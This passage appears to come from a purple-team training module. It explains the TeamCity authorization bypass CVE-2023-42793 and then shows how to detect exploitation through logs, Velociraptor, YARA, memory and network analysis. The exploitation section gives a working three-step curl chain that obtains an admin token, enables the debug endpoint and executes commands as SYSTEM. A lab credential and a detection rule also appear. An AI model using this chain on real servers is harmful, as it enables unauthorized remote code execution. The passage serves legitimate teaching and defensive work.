<ul>
<li><code>CVE-2023-42793 Analysis and Exploitation</code>: This part focuses on the technical details of the vulnerability, how it can be exploited, and strategies to mitigate it.</li>
<li><code>Post-Exploitation Forensic Analysis</code>: This part examines the forensic capabilities of Windows Purple Module targets by analyzing the system post-exploitation. It demonstrates how artifacts left by the attack can be identified and analyzed within a Windows Purple Module target to better understand the exploits impact and enhance our understanding of the attack from a defensive security perspective.</li>
</ul>
<h3 id="cve-2023-42793-analysis-and-exploitation">CVE-2023-42793 Analysis and Exploitation</h3>
<p>The <a href="https://www.sonarsource.com/blog/teamcity-vulnerability/">Sonar Vulnerability Research Team</a> identified a critical flaw in JetBrains TeamCity, tracked as <code>CVE-2023-42793</code>. This vulnerability allows unauthenticated attackers to execute arbitrary code on the server by bypassing authorization mechanisms. With a CVSS base score of <code>9.8</code>, all versions of TeamCity up to <code>2023.05.3</code> are affected.</p>
<p>The vulnerability exploits a weakness in <code>request interceptors</code> for paths ending with <code>/RPC2</code>. By bypassing authorization checks, attackers can gain full control over the TeamCity server.</p>
<p><strong>Understanding the Vulnerability</strong></p>
<p><strong>Request Interceptors in Java</strong></p>
<p>Request interceptors are components in Java web applications that process HTTP requests and responses. They are often used for tasks like logging, authentication, authorization, and modifying requests or responses. These interceptors ensure consistent handling and security across application endpoints.</p>
<p>TeamCity uses request interceptors to handle actions on every HTTP request, including authorization checks. The list of interceptors being used by the TeamCity server can be found in the configuration file <code>buildServerSpringWeb.xml</code>.</p>
<p>Code: java</p>
<pre><code class="lang-java"> <span class="hljs-tag">&lt;<span class="hljs-name">mvc:interceptors</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">"externalLoadBalancerInterceptor"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">"agentsLoadBalancer"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">"calledOnceInterceptors"</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">"pageExtensionInterceptor"</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">mvc:interceptors</span>&gt;</span>
</code></pre>
<p><strong>Authorization Bypass</strong></p>
<p>The vulnerable interceptor is <code>calledOnceInterceptors</code>, which is actually an object of the <code>RequestInterceptors</code> class. We can see that when constructing the object for the <code>RequestInterceptors</code> class, several Java beans are passed to it as a list, including <code>authorizedUserInterceptor</code>.</p>
<p>Code: java</p>
<pre><code class="lang-java"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"calledOnceInterceptors"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"jetbrains.buildServer.controllers.interceptors.RequestInterceptors"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">index</span>=<span class="hljs-string">"0"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">"mainServerInterceptor"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">"registrationInvitations"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">"projectIdConverterInterceptor"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">"authorizedUserInterceptor"</span>/&gt;</span>   <span class="hljs-comment">&lt;!-- HERE --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">"twoFactorAuthenticationInterceptor"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">"firstLoginInterceptor"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">"pluginUIContextProvider"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">"callableInterceptorRegistrar"</span>/&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>
</code></pre>
<p>The <code>RequestInterceptors</code> class intercepts HTTP requests through its <code>preHandle</code> method. Within this method, it calls the <code>requestPreHandlingAllowed</code> method, which checks a list of path expressions stored in <code>myPreHandlingDisabled</code>. If the requested path is not found in this list, pre-handling is applied. Notably, the list includes a wildcard path <code>/**</code> as an entry in <code>myPreHandlingDisabled</code>.</p>
<p><em>jetbrains.buildServer.controllers.interceptors.RequestInterceptors</em></p>
<p>Code: java</p>
<pre><code class="lang-java"><span class="hljs-keyword">public</span> RequestInterceptors(<span class="hljs-meta">@NotNull</span> List&lt;HandlerInterceptor&gt; var1) {
    <span class="hljs-comment">// ...</span>
    <span class="hljs-keyword">this</span>.myPreHandlingDisabled.addPath(<span class="hljs-string">"/**"</span> + XmlRpcController.getPathSuffix());

&lt;SNIP&gt;
</code></pre>
<p>The initial path expression starts with the static string <code>/**</code> and is appended by the return value of the <code>XmlRpcController.getPathSuffix()</code> method, which is the static string <code>/RPC2</code>. Therefore, the resulting path expression is <code>/**/RPC2</code>. This means that any request matching this path will bypass pre-handling interceptors, and consequently, no authorization check will be performed for these requests.</p>
<p>Notably, theres a wildcard present in the expression <code>/**/RPC2</code>, which implies that any request sent by an attacker to a path ending with <code>/RPC2</code> will bypass the authorization check.</p>
<hr>
<p><strong>Exploitation Process</strong></p>
<p>Let&#39;s navigate to the bottom of this section and click on &#39;<code>Click here to spawn the target system!</code>&#39;. Then, let&#39;s RDP into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.</p>
<p>\
Allow the target to run for at least 5 minutes after spawning to ensure that all services have fully initialized (including Velociraptor).\</p>
<p><strong>Obtaining an Authentication Token</strong></p>
<p>TeamCitys REST API includes an endpoint to create user authentication tokens by sending an HTTP POST request to the <code>/app/rest/users/{userLocator}/tokens/{name}</code> endpoint. This endpoint additionally allows us to provide a name for this token via the <code>{name}</code> request path parameter. If this value is set to <code>RPC2</code>, the request path will become <code>/app/rest/users/{userLocator}/tokens/RPC2</code> and will bypass the authorization check.</p>
<p>Typically, the first user with an ID of <code>1</code> is the <code>Administrator</code> account created during the initial installation. Thus, we can try to use the string <code>id:1</code> as the value for the <code>userLocator</code> parameter and attempt to issue a new authentication token for the Administrator user using this HTTP <code>POST</code> request.</p>
<p>&#x20; Usage Example: JetBrains TeamCity CVE-2023-42793</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -X POST <span class="hljs-keyword">http</span>://&lt;Target_IP&gt;/app/rest/users/id:<span class="hljs-number">1</span>/tokens/RPC2

<span class="hljs-meta">&lt;?</span>xml <span class="hljs-built_in">version</span>=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span> standalone=<span class="hljs-string">"yes"</span><span class="hljs-meta">?&gt;</span>&lt;<span class="hljs-keyword">token</span> name=<span class="hljs-string">"RPC2"</span> creationTime=<span class="hljs-string">"2024-11-13T06:55:16.176-06:00"</span> <span class="hljs-built_in">value</span>=<span class="hljs-string">"eyJ0eXAiOiAiVENWMiJ9.dWRYeEc2dFM3X2VuRV9yZTJCbFpOcUloNWVV.Y2M0ODIzZGEtMTUyNy00NmY3LThiNzgtM2E0M2YzMmY0YjQ4"</span>/&gt;
</code></pre>
<p>The response provides a valid Administrator token.</p>
<p><strong>Enabling Debug Mode for RCE</strong></p>
<p>After acquiring the Administrator authentication token, one approach to achieve RCE on the server is to exploit the debug endpoint in the REST API at <code>/app/rest/debug/processes</code>. Access to this endpoint is restricted by the <code>rest.debug.processes.enable</code> configuration option, which is disabled by default. Therefore, we must first enable this option with the following request.</p>
<p>&#x20; Usage Example: JetBrains TeamCity CVE-2023-42793</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ curl -H <span class="hljs-string">"Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.dWRYeEc2dFM3X2VuRV9yZTJCbFpOcUloNWVV.Y2M0ODIzZGEtMTUyNy00NmY3LThiNzgtM2E0M2YzMmY0YjQ4"</span> -X POST <span class="hljs-string">"http://&lt;Target_IP&gt;/admin/dataDir.html?action=edit&amp;fileName=config%2Finternal.properties&amp;content=rest.debug.processes.enable=true"</span>
</code></pre>
<p>We must also refresh the server to apply the debug mode.</p>
<p>&#x20; Usage Example: JetBrains TeamCity CVE-2023-42793</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.dWRYeEc2dFM3X2VuRV9yZTJCbFpOcUloNWVV.Y2M0ODIzZGEtMTUyNy00NmY3LThiNzgtM2E0M2YzMmY0YjQ4" "http://<span class="hljs-tag">&lt;<span class="hljs-name">Target_IP</span>&gt;</span>/admin/admin.html?item=diagnostics&amp;tab=dataDir&amp;file=config/internal.properties"

    <span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"admin-ui"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>TeamCity<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>


<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"Shortcut Icon"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/favicon.ico?v10"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"image/x-icon"</span> <span class="hljs-attr">sizes</span>=<span class="hljs-string">"16x16 32x32"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"format-detection"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"telephone=no"</span>/&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
</code></pre>
<p><strong>Executing Commands</strong></p>
<p>Now we can run arbitrary shell commands on the server with the following request to the <code>/app/rest/debug/processes</code> endpoint.</p>
<p>&#x20; Usage Example: JetBrains TeamCity CVE-2023-42793</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.dWRYeEc2dFM3X2VuRV9yZTJCbFpOcUloNWVV.Y2M0ODIzZGEtMTUyNy00NmY3LThiNzgtM2E0M2YzMmY0YjQ4" -X POST "http://&lt;Target_IP&gt;/app/rest/debug/processes?exePath=cmd.exe&amp;params=/c%20whoami"

StdOut:nt authority\system

StdErr: 
Exit code: 0
<span class="hljs-keyword">Time:</span> 107ms
</code></pre>
<hr>
<p><strong>Mitigation</strong></p>
<p>JetBrains has patched this vulnerability in TeamCity version <code>2023.05.4</code>, which was released on 2023-09-18. Thus, upgrading to this version is advised to effectively mitigate the vulnerability.</p>
<hr>
<h3 id="post-exploitation-forensic-analysis">Post-Exploitation Forensic Analysis</h3>
<p>Detecting exploitation attempts of the TeamCity RCE vulnerability can be achieved through the analysis of event logs and network traffic for indicators of compromise, among other methods. This part provides guidance on leveraging Windows event logs, Sysmon logs, and captured network traffic within the Windows Purple Module target to perform forensic analysis and identify evidence of exploitation related to the TeamCity RCE vulnerability.</p>
<p>Ensure that the target has sufficient lifetime to conduct the forensic analysis effectively. If the target&#39;s lifetime is insufficient, extend it as necessary before proceeding.</p>
<p>\
Once the attack part has been completed and the target&#39;s lifetime has been confirmed or extended, connect to the Windows Purple Module target to perform the forensic analysis.\</p>
<p><strong>Windows Log Analysis</strong></p>
<p>On Windows systems, monitoring Event ID <code>4688</code> (A new process has been created) or Event ID <code>1</code> (Sysmon: process creation) can help identify unexpected processes initiated by TeamCity. These logs can be accessed via the <code>Windows Event Viewer</code>.</p>
<p>To access Sysmon logs:</p>
<ul>
<li>Open the Event Viewer by typing <code>Event Viewer</code> in the Windows search bar and selecting the application.</li>
<li>In the Event Viewer, navigate to <code>Applications and Services Logs</code> &gt; <code>Microsoft</code> &gt; <code>Windows</code> &gt; <code>Sysmon</code> &gt; <code>Operational</code>.</li>
</ul>
<p>Review the logs for anomalies, such as unexpected parent-child process relationships. For example, TeamCity spawning unusual processes may indicate exploitation. The screenshot below highlights an unusual interaction between TeamCity&#39;s <code>java.exe</code> process and <code>cmd.exe</code>, where the latter executes a <code>whoami</code> command captured in Sysmon (Event ID 1) logs following the attack.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/sysmon1_tc.png" alt="Process execution details showing cmd.exe running whoami.exe, parent process java.exe."></p>
<p><strong>TeamCity Log Analysis</strong></p>
<p>After reviewing the Cybersecurity Advisory available at <a href="https://www.cisa.gov/sites/default/files/2023-12/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally_0.pdf">https://www.cisa.gov/sites/default/files/2023-12/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally_0.pdf</a>, we have identified several Indicators of Compromise (IOCs) that can help us determine if TeamCity has been compromised in our environment.</p>
<p>Let&#39;s focus on the string <code>internal.properties by user</code> from <code>APPENDIX A</code>. Instead of manually logging into the TeamCity host and reviewing the <code>teamcity-server.log</code> file for occurrences of the string, we can leverage <code>Velociraptor</code> to achieve this remotely. Using a straightforward <code>YARA</code> rule, we can automate the search for the string by leveraging <code>Velociraptor</code> on the Windows Purple module target (TeamCity host), accommodating potential variations in log names and locations.</p>
<ol>
<li>Log into Velociraptor and click on the downward arrow next to the <code>Search clients</code> bar, then select <code>Show All</code>. We should now see a display indicating that Velociraptor is fully initialized and operational.</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/257/velo1.png" alt="Velociraptor Response interface showing a connected client Logging-VM with Windows Server 2019."></p>
<ol>
<li>Click on the <code>crosshair</code> icon, then on the <code>+</code> icon to initiate a <code>New Hunt</code> and configure it as follows.</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/257/velo2.png" alt="Velociraptor Response interface with options to create a new hunt and view connected clients."></p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/velo3.png" alt="Configure Hunt interface for deploying Yara rule with options for expiry, conditions, and estimated affected clients."></p>
<ol>
<li>Click on <code>Select Artifacts</code> and choose <code>Windows.Search.Yara</code>.</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/257/velo4.png" alt="Configure Hunt interface for deploying Yara rule with options for expiry, conditions, and estimated affected clients"></p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/velo5.png" alt="Create Hunt interface selecting Windows.Search.Yara artifact with parameters for Yara rule configuration."></p>
<ol>
<li>Click on <code>Configure Parameters</code>, select <code>Windows.Search.Yara</code> again, and configure as follows.</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/257/velo6.png" alt="Create Hunt interface selecting Windows.Search.Yara artifact with parameters for Yara rule configuration."></p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/velo7.png" alt="Velociraptor interface showing &#39;Create Hunt: Configure artifact parameters&#39; with fields for artifact name, Yara rule, and NTFS cache time."></p>
<ol>
<li>Click <code>Launch</code> to start the hunt.</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/257/velo8.png" alt="Velociraptor interface for configuring artifact parameters with fields for artifact name, Yara rule, and NTFS cache time."></p>
<ol>
<li>Once the hunt is created, click on it and press the <code></code> icon.</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/257/velo9.png" alt="Velociraptor interface showing hunt details with artifact names, hunt ID, and Yara rule configuration."></p>
<ol>
<li>After a few minutes, check the <code>Notebook</code> tab, which should display the results of the hunt.</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/257/velo10.png" alt="Velociraptor interface displaying hunt results with Yara rule matches, file paths, and hit details."></p>
<ol>
<li><p>Take note of the returned path and use Velociraptors remote shell functionality to further investigate the log and verify if there is an actual compromise. The log name and path turned out to be the default ones after all.</p>
</li>
<li><p>Navigate to the client identified earlier and click on the Client ID.</p>
</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/257/velo1.png" alt="Velociraptor interface showing client search results with details like client ID, hostname, and OS version."></p>
<ul>
<li>Click on the <code>&gt;Shell</code> icon.</li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/257/velo11.png" alt="Velociraptor interface displaying client details with information on client ID, agent version, and operating system."></p>
<ul>
<li>Execute <code>cat C:\TeamCity\logs\teamcity-server.log</code> to review the content of the log. Click on the <code>eye</code> or <code>Load Output</code> icon to load the log output.</li>
</ul>
<p><img src="https://academy.hackthebox.com/storage/modules/257/velo12.png" alt="Velociraptor interface with a PowerShell command to view TeamCity server logs."> <img src="https://academy.hackthebox.com/storage/modules/257/velo13.png" alt="Velociraptor interface with a PowerShell command to display TeamCity server logs."></p>
<ol>
<li>Search for <code>internal.properties by user</code> in the log. The following part of the log is indicative of a successful compromise.</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/257/velo14.png" alt="Velociraptor interface displaying PowerShell output of TeamCity server log entries."></p>
<p><strong>Memory Analysis</strong></p>
<p>As previously noted, the presence of a request containing <code>cmd.exe&amp;params=</code> is an indicator of potential compromise.</p>
<p>As an alternative investigation method, the memory of the host system can be dumped and analyzed using a simple YARA rule designed to search the memory dump for occurrences of <code>cmd.exe&amp;params=</code> as follows.</p>
<p>&#x20; Usage Example: JetBrains TeamCity CVE-2023-42793</p>
<pre><code class="lang-cmd-session">C:\Tools\<span class="hljs-keyword">Memory</span>-Dump&gt;DumpIt.exe
  DumpIt - v1.3.2.20110401 - <span class="hljs-keyword">One</span> click <span class="hljs-keyword">memory</span> <span class="hljs-keyword">memory</span> dumper
  <span class="hljs-keyword">Copyright</span> (c) 2007 - 2011, Matthieu Suiche &lt;http:<span class="hljs-comment">//www.msuiche.net&gt;</span>
  <span class="hljs-keyword">Copyright</span> (c) 2010 - 2011, MoonSols &lt;http:<span class="hljs-comment">//www.moonsols.com&gt;</span>


    Address space size:        5368709120 bytes (   5120 Mb)
    Free space size:           5687996416 bytes (   5424 Mb)

<span class="hljs-comment">    * Destination = \??\C:\Tools\Memory-Dump\LOGGING-VM-20241126-111433.raw</span>

    --&gt; Are you sure you want to <span class="hljs-keyword">continue</span>? [y/<span class="hljs-keyword">n</span>] <span class="hljs-built_in">y</span>
    + Processing... Success.
</code></pre>
<p>Code: yara</p>
<pre><code class="lang-yara"><span class="hljs-selector-tag">rule</span> <span class="hljs-selector-tag">Detect_Cmd_Parameters</span> {
    <span class="hljs-attribute">meta</span>:
        description = <span class="hljs-string">"Detects the presence of 'cmd.exe&amp;params=' string in memory"</span>
        author = <span class="hljs-string">"Your Name"</span>
        date = <span class="hljs-string">"2024-11-26"</span>

    strings:
        $string1 = <span class="hljs-string">"cmd.exe&amp;params="</span> ascii

    condition:
        $string1
}
</code></pre>
<p>&#x20; Usage Example: JetBrains TeamCity CVE-2023-42793</p>
<pre><code class="lang-cmd-session">c:<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\y</span>ara&gt; yara.exe teamcity.yar C:<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\M</span>emory-Dump<span class="hljs-symbol">\L</span>OGGING-VM-20241126-111433.raw
Detect_Cmd_Parameters C:<span class="hljs-symbol">\T</span>ools<span class="hljs-symbol">\M</span>emory-Dump<span class="hljs-symbol">\L</span>OGGING-VM-20241126-111433.raw
</code></pre>
<p>The YARA rule was triggered because the string <code>cmd.exe&amp;params=</code> was found in the dumped memory.</p>
<p>We could achieve similar results by using <code>Process Hacker</code> to examine the memory space of the <code>java.exe</code> process as follows after the attack part has concluded.</p>
<ol>
<li>Launch <code>Process Hacker</code> with administrative privileges, locate the <code>TeamCityService</code> process in the interface, and expand it to find the associated child <code>java.exe</code> process.</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/257/ph1.png" alt="Process Hacker showing TeamCityService.exe with cmd.exe and java.exe as subprocesses."></p>
<ol>
<li>Right-click on the <code>java.exe</code> process, select <code>Properties</code>, navigate to the <code>Memory</code> tab, and access the process&#39;s memory details.</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/257/ph2.png" alt="Process Hacker showing java.exe properties with details like command line, current directory, and parent process."></p>
<ol>
<li>In the <code>Memory</code> tab, click <code>Strings</code>, proceed with the default parameters, and confirm with <code>OK</code> to scan readable strings in memory.</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/257/ph3.png" alt="Process Hacker showing java.exe memory properties with base addresses and protection types."></p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/ph4.png" alt="Process Hacker showing java.exe memory properties with string search options for minimum length and memory regions."></p>
<ol>
<li>After the string scan completes, click <code>Filter</code>, choose <code>Contains (case-insensitive)</code>, enter <code>cmd.exe&amp;params=</code> as the keyword, and click <code>OK</code> to search for matches.</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/257/ph5.png" alt="Process Hacker showing java.exe memory results with string search filter options and addresses."></p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/ph6.png" alt="Process Hacker showing java.exe memory results with filter pattern input for searching strings."></p>
<ol>
<li>After filtering with <code>Contains (case-insensitive)</code> and entering <code>cmd.exe&amp;params=</code>, the string was found within the memory space of the <code>java.exe</code> process. This could suggest the presence of commands or scripts being executed from within the <code>java.exe</code> process, potentially indicating malicious activity.</li>
</ol>
<p><img src="https://academy.hackthebox.com/storage/modules/257/ph7.png" alt="Process Hacker showing java.exe memory results with addresses and string search results."></p>
<p><strong>Traffic Analysis</strong></p>
<p>To analyze network traffic related to the attack, you can leverage the automatic traffic capturing that is configured to occur on all Windows Purple module targets at boot. The traffic capture files can be accessed as follows:</p>
<ol>
<li>Once the attack part is complete, connect to the Windows Purple module target (TeamCity host) via RDP.</li>
<li>Execute the <code>Stop-Traffic-Capture.bat</code> script located on the <code>desktop</code> to terminate traffic capture and access the saved files.</li>
<li>Navigate to the directory: <code>C:\Tools\PCAP-Captures\Archives</code>, where the captured <code>.pcap</code> files are stored.</li>
<li>Unzip the archive and open the .pcap file(s) in Wireshark.</li>
</ol>
<p><strong>Inspecting HTTP Traffic in Wireshark</strong></p>
<p>In Wireshark, we can quickly review the capture summary of HTTP requests for any suspicious activity by navigating to &quot;<code>Statistics</code>&quot; &gt; &quot;<code>HTTP</code>&quot; &gt; &quot;<code>Requests</code>&quot;.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/teamcity-4.png" alt="Wireshark requests capture summary showing file paths and command parameters."></p>
<p>HTTP <code>POST</code> requests can be shown using the <code>http.request.method</code> filter as follows:</p>
<p>Code: wireshark</p>
<pre><code class="lang-wireshark">http<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.method</span>==POST
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/257/teamcity-6.png" alt="Wireshark capture showing HTTP POST requests with details on source, destination, and command parameters."></p>
<p>For deeper analysis:</p>
<ul>
<li>Right-click on a suspicious-looking packet.</li>
<li>Select <code>Follow Stream</code> &gt; <code>HTTP Stream</code> to view detailed request and response data.</li>
</ul>
<p>Example of HTTP request and response details:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/257/teamcity-5.png" alt="Wireshark HTTP stream showing a POST request with command parameters and server response details."></p>
<p>The screenshot above highlights a segment of the attack where commands are executed via the <code>/app/rest/debug/processes</code> endpoint, demonstrating unauthorized use of the debug API to achieve remote code execution.</p>
<hr>
<p>This is just the tip of the iceberg in terms of the possible detection avenues one can pursue by leveraging the built-in logging capabilities and the DFIR toolset of Windows Purple Module targets. Feel free to experiment and identify your own investigation avenues.</p>
<hr>
<h2 id="available-linux-dfir-toolset">Available Linux DFIR Toolset</h2>
<p>This section provides an overview of the installed DFIR toolset within the Linux Purple module targets, detailing the available tools/solutions and their respective locations.</p>
<h3 id="installed-tools-and-locations">Installed Tools and Locations</h3>
<p>Below is a list of the DFIR toolset installed on the Linux Purple module targets for <code>post-exploitation</code> forensic analysis purposes, along with their respective installation paths.</p>
<h4 id="system-monitoring-auditing-event-logging-">System Monitoring &amp; Auditing (Event Logging)</h4>
<table>
<thead>
<tr>
<th><strong>Tool</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Sysmon (Linux)</strong></td>
<td><code>/usr/bin/sysmon</code></td>
<td>Provides detailed event logging and detection.</td>
</tr>
<tr>
<td><strong>Auditd</strong></td>
<td><code>/usr/sbin/auditd</code></td>
<td>Auditing tool to track system-level events.</td>
</tr>
</tbody>
</table>
<h4 id="threat-detection-monitoring">Threat Detection &amp; Monitoring</h4>
<table>
<thead>
<tr>
<th><strong>Tool</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>YARA</strong></td>
<td><code>/usr/local/bin/yara</code></td>
<td>Signature-based file scanning tool.</td>
</tr>
<tr>
<td><strong>Sigma</strong></td>
<td><code>/usr/local/bin/sigma</code></td>
<td>Generic signature format for SIEM rule creation.</td>
</tr>
<tr>
<td><strong>Suricata</strong></td>
<td><code>/usr/bin/suricata</code></td>
<td>Open-source IDS/IPS with network monitoring capabilities.</td>
</tr>
<tr>
<td><strong>osquery</strong></td>
<td><code>/usr/bin/osqueryi</code></td>
<td>Endpoint monitoring using SQL-like queries.</td>
</tr>
<tr>
<td><strong>Zircolite</strong></td>
<td><code>/root/zircolite/zircolite.py</code></td>
<td>Sigma-based EVTX log analysis.</td>
</tr>
<tr>
<td><strong>Velociraptor</strong></td>
<td><code>/usr/local/bin/velociraptor</code> (<code>https://&lt;Target_IP&gt;:8889</code>)</td>
<td>Endpoint monitoring, collection, and response.</td>
</tr>
<tr>
<td><strong>bpftrace</strong> (Added after this module&#39;s release; not available in its targets)</td>
<td><code>/usr/bin/bpftrace</code></td>
<td>High-level tracing language for Linux</td>
</tr>
</tbody>
</table>
<p><strong>Notes</strong>:</p>
<ul>
<li>Specify the following credentials to log into <code>Velociraptor</code>:<ul>
<li>Username: <code>admin</code></li>
<li>Password: <code>P3n#31337@LOG</code></li>
</ul>
</li>
<li><code>Allow Linux Purple module targets to run for around 3-5 minutes after spawning</code> to ensure that all services have fully initialized (including Velociraptor).</li>
</ul>
<h4 id="traffic-capturing">Traffic Capturing</h4>
<table>
<thead>
<tr>
<th><strong>Tool</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>tcpdump</strong></td>
<td><code>/usr/bin/tcpdump</code></td>
<td>Packet capture tool for network traffic analysis.</td>
</tr>
</tbody>
</table>
<h4 id="memory-dumping">Memory Dumping</h4>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>LiME</strong></td>
<td><code>/root/LiME/src/lime-5.15.0-71-generic.ko</code></td>
<td>Linux Memory Extractor for memory forensics.</td>
</tr>
</tbody>
</table>
<h4 id="memory-forensics">Memory Forensics</h4>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Volatility v2</strong></td>
<td><code>/root/volatility-master/vol.py</code></td>
<td>Memory forensics tool for analyzing memory dumps.</td>
</tr>
</tbody>
</table>
<h4 id="adversary-simulation">Adversary Simulation</h4>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Atomic Red Team</strong> (Added after this module&#39;s release; not available in its targets)</td>
<td><code>/root/AtomicRedTeam</code></td>
<td>Small and highly portable detection tests based on MITRE&#39;s ATT\&amp;CK.</td>
</tr>
</tbody>
</table>
<h4 id="miscellaneous">Miscellaneous</h4>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Path</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Python2.7</strong></td>
<td><code>/usr/bin/python2.7</code></td>
<td>Python2.7 is used for running python2 based tools i.e. vol.py</td>
</tr>
<tr>
<td><strong>Python3</strong></td>
<td><code>/usr/bin/python3</code></td>
<td>Python3 is used for running python3 based tools i.e. Zircolite</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="linux-logs-traffic-captured">Linux Logs &amp; Traffic Captured</h2>
